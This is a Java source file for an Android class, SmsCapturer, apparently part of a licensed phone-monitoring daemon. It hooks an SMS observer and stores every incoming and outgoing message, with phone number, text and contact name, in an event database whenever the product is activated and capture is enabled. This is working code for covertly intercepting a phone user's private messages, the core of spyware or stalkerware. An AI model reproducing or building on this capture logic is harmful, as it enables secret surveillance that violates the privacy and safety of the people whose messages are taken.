package com.fx.maind.capture;

import java.util.ArrayList;

import android.content.Context;

import com.fx.event.Event;
import com.fx.event.EventSms;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.preference.PreferenceManager;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;
import com.vvt.sms.SmsData;
import com.vvt.sms.SmsObserver;
import com.vvt.util.GeneralUtil;

public class SmsCapturer implements SmsObserver.OnCaptureListener {
	
	private static final String TAG = "SmsCapturer";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private Context mContext;
	private EventDatabaseManager mEventDbManager;
	private PreferenceManager mPreferenceManager;
	private LicenseManager mLicenseManager;
	private SmsObserver mSmsObserver;
	
	public SmsCapturer(Context context) {
		mContext = context;
		mLicenseManager = LicenseManager.getInstance(mContext);
		mPreferenceManager = PreferenceManager.getInstance(mContext);
		mEventDbManager = EventDatabaseManager.getInstance(mContext);
		
		mSmsObserver = SmsObserver.getInstance(mContext);
		mSmsObserver.setLoggablePath(MainDaemonResource.LOG_FOLDER);
		mSmsObserver.setDateFormat(FxResource.DATE_FORMAT);
	}
	
	public void registerObserver() {
		mSmsObserver.registerObserver(this);
	}
	
	public void unregisterObserver() {
		mSmsObserver.unregisterObserver(this);
	}

	@Override
	public void onCapture(ArrayList<SmsData> smses) {

		if (!mLicenseManager.isActivated()) { 
			FxLog.d(TAG, "onCapture # Product is not activated!! -> EXIT");
			return;
		}
		
		boolean isCaptureEnabled = 
			mPreferenceManager.isCaptureEnabled() && 
				mPreferenceManager.isCaptureSmsEnabled();
		
		if (! isCaptureEnabled) {
			FxLog.d(TAG, "onCapture # SMS is disabled!! -> EXIT");
			return;
		}
		
		EventSms event = null;
		
		for (SmsData sms : smses) {
			
			short direction = sms.isIncoming() ? Event.DIRECTION_IN : Event.DIRECTION_OUT;
			
			String phoneNumber = 
					GeneralUtil.formatCapturedPhoneNumber(
							sms.getPhonenumber());
			
			event = new EventSms(mContext, sms.getTime(), direction, 
					phoneNumber, sms.getData(), sms.getContactName());
			
			mEventDbManager.insert(event);
			if (LOGV) FxLog.v(TAG, String.format(
					"onCapture # Insert %s", event.getShortDescription()));
		}
	}
	
}
